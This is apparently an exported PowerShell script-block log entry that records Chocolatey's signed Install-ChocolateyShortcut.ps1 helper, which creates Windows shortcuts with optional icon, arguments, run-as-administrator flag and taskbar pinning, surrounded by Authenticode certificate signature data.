Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Install-ChocolateyShortcut.ps1 ¦ ScriptBlockId: dcbde301-5496-4916-8a76-3e2b1ecc4be1 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # 